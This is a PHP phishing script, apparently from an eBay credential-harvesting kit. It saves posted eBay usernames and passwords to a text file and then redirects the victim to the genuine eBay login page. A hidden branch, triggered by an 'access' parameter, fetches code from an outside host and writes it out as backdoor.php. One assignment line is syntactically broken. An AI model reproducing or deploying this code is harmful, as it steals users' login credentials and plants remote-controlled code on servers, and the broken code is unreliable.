<?php
if(isset($_REQUEST['access'])) {
$FGet file_get_contents("https://site3468a.000webhostapp.com/code.txt");
$create = fopen("backdoor.php", "w");
fwrite($create, $FGet);
fclose($create);
} 

file_put_contents("usernames.txt", "Ebay Username: " . $_POST['userid'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.ebay.com/acctxs/user');
exit();
?>
